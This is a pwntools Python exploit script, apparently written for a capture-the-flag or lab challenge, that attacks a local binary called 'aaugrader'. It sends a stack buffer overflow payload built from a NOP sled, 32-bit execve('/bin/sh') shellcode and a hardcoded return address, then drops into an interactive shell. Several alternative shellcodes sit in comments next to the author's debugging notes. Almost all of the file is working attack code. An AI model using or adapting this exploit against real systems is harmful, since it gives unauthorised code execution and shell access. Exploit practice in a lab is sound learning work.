#!/opt/pwntools/venv/bin/python3
import sys
from pwn import *

BINARY = './aaugrader'
exe = context.binary = ELF(BINARY)

# p = connect(HOST, PORT)
p = process(BINARY, level='debug')

print(p.recvuntil(b"Username: "))

# https://shell-storm.org/shellcode/files/shellcode-846.html
# badchars: 0x0a,0x0b,0x0c,0x0d

# shellcode =  b""
# shellcode += b"\x29\xc9\x83\xe9\xf5\xe8\xff\xff\xff\xff\xc0\x5e"
# shellcode += b"\x81\x76\x0e\x28\x15\xda\x4f\x83\xee\xfc\xe2\xf4"
# shellcode += b"\x42\x1e\x82\xd6\x7a\x73\xb2\x62\x4b\x9c\x3d\x27"
# shellcode += b"\x07\x66\xb2\x4f\x40\x3a\xb8\x26\x46\x9c\x39\x1d"
# shellcode += b"\xc0\x1d\xda\x4f\x28\x3a\xb8\x26\x46\x3a\xa9\x27"
# shellcode += b"\x28\x42\x89\xc6\xc9\xd8\x5a\x4f"

# Did not work?
# shellcode = b"\x31\xF6\x56\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x54\x5F\xF7\xEE\xB0\x3B\x0F\x05"

# https://shell-storm.org/shellcode/files/shellcode-806.html
# shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

# xor    eax,eax
# push   eax
# push   0x68732f2f
# push   0x6e69622f
# mov    ebx,esp
# push   eax
# push   ebx
# mov    ecx,esp
# mov    al,0xa0
# sub    al,0x8c
# int    0x80 

shellcode = b"\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\xB0\xA0\x2C\x8C\xCD\x80"

#   0xffffd293                  xor    eax, eax
#   0xffffd295                  push   eax
#   0xffffd296                  push   0x68732f2f
# â†’ 0xffffd29b                  push   0x5655b5c0 -> SOME SORT OF CORRUTION RIGHT HERE!!!
#   0xffffd2a0                  mov    ebx, esp
#   0xffffd2a2                  push   eax
#   0xffffd2a3                  push   ebx
#   0xffffd2a4                  mov    ecx, esp
#   0xffffd2a6                  mov    al, 0xa0


print(str(len(shellcode)))
pause()
retAddr = p32(0xffffd250)

padding = 96

payload = b"\x90" * (padding - len(shellcode))
payload += shellcode
payload += retAddr

p.send(payload)
p.interactive()
